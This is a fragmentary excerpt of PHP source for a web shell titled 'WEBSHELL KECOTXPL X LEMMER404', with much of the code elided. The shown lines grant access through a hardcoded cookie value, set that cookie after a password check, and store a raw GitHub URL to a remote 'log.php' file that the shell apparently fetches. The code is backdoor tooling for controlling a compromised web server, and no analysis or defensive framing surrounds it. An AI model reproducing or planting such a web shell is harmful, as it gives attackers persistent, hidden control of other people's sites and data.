...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@lemmer404'; 
}
...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/Arya133/PHP/refs/heads/main/log.php';
    ...
    if (isset($_POST['password'])) {
        ...
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'admin@lemmer404', time() + 3600, '/'); 
    ...
    <html>
    <head>
        <title>WEBSHELL KECOTXPL X LEMMER404</title>
        <style>
            body {
                margin: 0;
                padding: 0;
